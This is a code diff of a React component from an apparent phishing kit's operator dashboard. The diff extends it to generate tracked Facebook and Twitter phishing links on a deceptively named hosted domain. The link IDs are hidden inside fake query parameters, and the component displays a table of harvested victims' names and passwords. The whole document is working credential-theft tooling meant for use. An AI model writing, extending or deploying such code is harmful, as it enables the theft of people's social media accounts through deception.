@@ -1,15 +1,19 @@
 import React, { useEffect, useRef, useState } from "react";
 import PhishData from './PhishData'
 const HackedDetail = ({keyValue}) => {
-  const [link, setLink] = useState("");
+  const [fbLink, setFbLink] = useState("");
+  const [twitterLink, setTwitterLink] = useState("");
   const [userKey, setUserKey] = useState("");
   const [phishData, setPhishData] = useState([]);
+  const twitterLinkCopy = useRef(null);
   const FBLinkCopy  = useRef(null);
+  const ref = {current:[FBLinkCopy,twitterLinkCopy]};
   
-  const copyToClipboard = (e) => {
-    FBLinkCopy.current.select();
+  const copyToClipboard = (target,web) => {
+    target.current.select();
     document.execCommand('copy');
-    alert('Copy Successful')
+    alert(`${web} Link Copy Successful`)
+    // console.log(target);
   };
 
 
@@ -36,22 +40,30 @@ const HackedDetail = ({keyValue}) => {
     const split1 = Math.round(split.length/2)
 
     let fakeId ='';
-    let fakeId2 = '&&query=24798dak+ded&&refer+facebook&&redirect=jkl';
+    let facebookLink = '&&query=24798dak+ded&&refer+facebook&&redirect=jkl';
+    let twitterLink =  '&&query=24798dak+ded&&refer+twitter&&redirect=jkl'
 
     for (let i = 0; i < split1; i++) {
         const element = split[i];
         fakeId += element
     }
+    // console.log(fakeId);
 
     for (let i = split1; i < split.length; i++) {
         const element = split[i];
-        fakeId2 +=element
+        facebookLink +=element;
+        twitterLink +=element
     }
+    // console.log(twitterLink);
 
-    const splitIdForFinal = fakeId+fakeId2;
+    const facebookTrackId = fakeId+facebookLink;
+    const twitterTrackId = fakeId+ twitterLink;
 
-    const finalLink = `https://phishing-3ea7d.web.app/facebook?id=${splitIdForFinal}`;
-    setLink(finalLink);
+    const fbPhishLink = `https://socialmediaupdate-67add.web.app/facebook?id=${facebookTrackId}`;
+    const twitterPhishLink = `https://socialmediaupdate-67add.web.app/twitter?id=${twitterTrackId}`;
+
+    setTwitterLink(twitterPhishLink);
+    setFbLink(fbPhishLink);
   };
 
   useEffect(() => {
@@ -74,26 +86,39 @@ const HackedDetail = ({keyValue}) => {
   return (
     <div className="text-center mt-5">
       <h2>Phish Link List</h2>
-      <button onClick={() => handelLink(userKey[0].key)} className="btn btn-danger">
+      <button onClick={() => handelLink(userKey[0].key)} className="btn btn-danger mb-3">
         Generate
-      </button>
+      </button> <br />
       {
-        link ? <button className="ms-3 btn btn-success" onClick={copyToClipboard}><i class="far fa-copy"></i></button> : ''
+        fbLink ? <button className="btn btn-success" onClick={() => copyToClipboard(ref.current[0],'Facebook')}><i class="far fa-copy"></i></button> : ''
       }
-      <p id="" className="my-2">
-        <a href={link}>
-          <span>{link}</span>
+
+      <p className="my-2">
+        <a href={fbLink}>
+          <span>{fbLink}</span>
         </a>
       </p>
-      <textarea className="fbLink" ref={FBLinkCopy} value={link}></textarea>
+      <textarea className="fbLink" ref={FBLinkCopy} value={fbLink}></textarea>
+
+      {/* Twitter Link View */}
+      {
+        twitterLink ? <button className="btn btn-success" onClick={() => copyToClipboard(ref.current[1],'Twitter')}><i class="far fa-copy"></i></button> : ''
+      }
+      <p className="my-2">
+        <a href={twitterLink}>
+          <span>{twitterLink}</span>
+        </a>
+      </p>
+      <textarea className="twitter" ref={twitterLinkCopy} value={twitterLink}></textarea>
 
 
     <h3 className="my-3"><span>My Phish Data : <span className="name">{phishData.length}</span></span></h3>
 
-    <table className="table table-dark">
+    <table className="table table-dark table-striped">
         <thead>
             <tr>
                 <th>*</th>
+                <th>Website</th>
                 <th>Name</th>
                 <th>Password</th>
             </tr>
